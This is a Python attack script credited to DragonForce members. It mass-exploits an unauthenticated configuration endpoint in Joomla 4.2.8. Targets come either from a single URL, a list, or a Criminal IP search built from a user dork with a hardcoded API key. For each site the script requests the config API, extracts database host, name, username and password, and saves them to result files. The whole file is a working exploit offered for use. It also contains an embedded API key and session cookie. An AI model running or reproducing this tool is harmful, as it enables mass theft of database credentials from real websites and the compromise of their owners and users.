# Dorker Author: ManGTX
# Python (POC): Pari Malam

import requests
import sys
from sys import stdout
import argparse
import os
import re
import urllib.request
import colorama
from colorama import Fore, Style, Back, init
import cloudscraper

init(autoreset=True)
cloudscraper.DEFAULT_SCRAPER = None
requests.urllib3.disable_warnings()

if not os.path.exists('Results'):
    os.mkdir('Results')

def banners():
    stdout.write("                                                                                         \n")
    stdout.write(" "+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(" "+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(" "+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(" "+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(" "+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(" "+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(" "+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(" "+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(" "+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(" "+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM & MANGTX                           "+Fore.YELLOW+"║\n")
    stdout.write(" "+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(" "+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(" "+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(" "+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   @DRAGONFORCE.IO                               "+Fore.YELLOW+"║\n")
    stdout.write(" "+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW} Perform with Dork Scanner and Massive with Joomla 4.2.8\n")
banners()

def search_for_ips():
    dork = input(f"\n{Fore.YELLOW} Please enter your Dork: {Fore.RESET}")
    print(f"{Fore.YELLOW}\n [w00t!] - {Fore.GREEN}Please be patient ...")
    print(f"{Fore.YELLOW} [w00t!] - {Fore.GREEN}Starting IP Search ...")
    headers = {
        "x-api-key": "AYNUdcL1thinxcraCUnUjKazLSyrmnjYuSxtbPn6m4zWWGuCFcGcKn4EiQLx",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "cookie": "D_VISITOR_ID=33a06ae9-0aa6-3c84-e5fb-5e92b48c9600"

    }
    scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'darwin',
            'mobile': False
        }
    )
    ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
    regex = '|'.join([ip_pattern])
    ips_found = []
    with open("Results/IPs.txt", "w") as f:
        for offset in range(0, 11):
            endpoint = f"https://api.criminalip.io/v1/banner/search?query={dork}&offset={offset}"
            try:
                response = scraper.get(endpoint, headers=headers, timeout=15)
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED} Error while scraping endpoint: {e}")
                break
            ip_addresses = re.findall(regex, response.text)

            if not ip_addresses:
                break

            ips_found.extend(ip_addresses)

        ips_found = list(set(ips_found))

        with open("Results/IPs.txt", "w") as f:
            for ip in ips_found:
                f.write(ip + "\n")

        print(f"{Fore.YELLOW} [w00t!] - {Fore.GREEN}Found! {len(ips_found)} IPs, in Results/IPs.txt.")


def scan_single_url(url=''):
    if url == '':
        url = input(f"\n{Fore.YELLOW} Please enter the URLs: {Fore.RESET}")
    print(f"{Fore.GREEN} \nScanning {url}\n")
    try:
        headers = {
            "content-type": "application/vnd.api+json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }
        response = requests.get(url, headers=headers, timeout=15)
        config_url = url + '/api/index.php/v1/config/application?public=true'
        config_response = requests.get(config_url)
        if config_response.status_code == 200 and b'dbtype' in config_response.content:
            decoded_content = config_response.content.decode()
            if 'dbtype' in decoded_content:
                hoset = re.findall('"host":"(.*?)"', decoded_content)[0]
                debst = re.findall('"db":"(.*?)"', decoded_content)[0]
                uset = re.findall('"user":"(.*?)"', decoded_content)[0]
                paset = re.findall('"password":"(.*?)"', decoded_content)[0]

                print(f"{Fore.YELLOW} Domain: {url}")
                print(f"{Fore.GREEN} HOST: {hoset}{Fore.RESET}")
                print(f"{Fore.GREEN} DB: {debst}{Fore.RESET}")
                print(f"{Fore.GREEN} User: {uset}{Fore.RESET}")
                print(f"{Fore.GREEN} Pass: {paset}{Fore.RESET}")

                with open('Results/Configurations.txt', 'a') as f:
                    f.write(f"{url}\nHOST: {hoset}\nDB: {debst}\nUser: {uset}\nPass: {paset}\n\n")

                return decoded_content, True
    except Exception as e:
        print(f"{Fore.RED}Error occurred when scanning {url}: {e}{Fore.RESET}")

    return '', False

def scan_multiple_urls():
    url_list = input(f"\n{Fore.YELLOW} Domain Or IPs List: {Fore.RESET}")
    print(f"\n{Fore.GREEN} Starting URLs scan")
    if not os.path.exists("Results"):
        os.makedirs("Results")
    with open(url_list, "r") as f:
        for url in f:
            url = url.strip()
            if not url.startswith('https://') and not url.startswith('http://'):
                url = 'http://' + url

            if re.match(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", url):
                url_file_name = f"IPs_{url}.txt"
            else:
                url_file_name = re.sub(r"http?://", "", url).rstrip("/") + ".txt"

            url_file_path = f"Results/{url_file_name}"
            response, sensitive_matches = scan_single_url(url.strip())

            if sensitive_matches:
                decoded_content = response
                hoset = re.findall('"host":"(.*?)"', decoded_content)[0]
                debst = re.findall('"db":"(.*?)"', decoded_content)[0]
                uset = re.findall('"user":"(.*?)"', decoded_content)[0]
                paset = re.findall('"password":"(.*?)"', decoded_content)[0]
                with open(url_file_path, "w", encoding="utf-8") as f:
                    f.write(decoded_content)
                print(f"{Fore.YELLOW} Sensitive information found on {url}. Output saved to {url_file_path}")
                with open('Results/Configurations.txt', 'a') as f:
                    f.write(f"{url}\nHOST: {hoset}\nDB: {debst}\nUser: {uset}\nPass: {paset}\n\n")
            elif response:
                print(f"{Fore.RED} No sensitive information found on {url}")
            else:
                print(f"{Fore.RED} Error occurred in scanning {url}")
                print(f"{Fore.YELLOW} URL scan complete.{Fore.RESET}")


if __name__ == '__main__':
    choice = input(f"\n{Fore.GREEN} Please choose an option: \n\n {Fore.YELLOW}[1] - Search for IPs \n [2] - Scan a single URL \n [3] - Scan multiple URLs \n\n {Fore.GREEN}Enter your choice: {Fore.RESET}")
    if choice == '1':
        search_for_ips()
    elif choice == '2':
        response, sensitive_matches = scan_single_url()
        if sensitive_matches:
            print(f"{Fore.GREEN} [w00t!] - Found! {url}:\n{response}")
        else:
            print(f"{Fore.RED} [w00t!] - Failed! {url}")
    elif choice == '3':
        scan_multiple_urls()
    else:
        print(f"\n{Fore.RED} Invalid option selected")
